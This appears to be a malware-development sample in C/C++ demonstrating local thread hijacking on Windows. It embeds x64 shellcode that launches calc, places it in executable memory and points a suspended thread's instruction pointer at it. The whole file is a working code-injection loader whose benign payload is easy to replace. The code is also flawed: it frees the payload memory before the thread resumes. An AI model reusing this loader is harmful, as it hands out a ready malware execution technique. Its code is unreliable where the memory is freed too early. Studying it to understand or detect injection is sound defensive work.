/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Running a base thread hijacking.
 */

#include <windows.h>
#include <iostream>

// x64 calc payload => maldev sample.
unsigned char CalcPayload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

/**
 * @param hThread => handle to a suspended thread.
 * @param pPayload => ptr to payload.
 * @param sPayloadSize => SIZE_T sizeof payload.
 */
BOOL BaseHijack(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize){
    BOOL  STATE          = TRUE;
    DWORD oldProctection = NULL;
    PVOID pAddress       = NULL;

    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
    };

    //Allocate mem.
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(pAddress == NULL){
        printf("[!] Error allocating virtual memory. \n");
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    //Changing protect
    if(!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &oldProctection)){
        printf("[!] Error protecting memory \n");
        STATE = FALSE; goto _EndFunc;
    }

    //Getting original thread context
    if(!GetThreadContext(hThread, &ThreadCtx)){
        printf("[!] GetThreadContext failed.");
        STATE = FALSE; goto _EndFunc;
    }

    //updating the new instruction pointer to be equal to the payload's address.
    ThreadCtx.Rip = (DWORD64)pAddress;

    //Updating the new context
    if(!SetThreadContext(hThread, &ThreadCtx)){
        printf("[!] SetThreadContext failed.");
        STATE = FALSE; goto _EndFunc;
    }

_EndFunc:
    if(pAddress){
        VirtualFree(pAddress, 0, MEM_RELEASE);
    }

    return STATE;
}

//from maldev.
VOID DummyFunction() {

	// stupid code
	int		j		= rand();
	int		i		= j * j;

}

//test.
int main(){
    DWORD  dwThreadId	= NULL;
    HANDLE hThread      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    printf("Locale thread hijacking for TID %d \n", dwThreadId);

    if(!BaseHijack(hThread, CalcPayload, sizeof(CalcPayload))){
        return EXIT_FAILURE;
    };

    printf("DONE... \n");
    printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return EXIT_SUCCESS;
}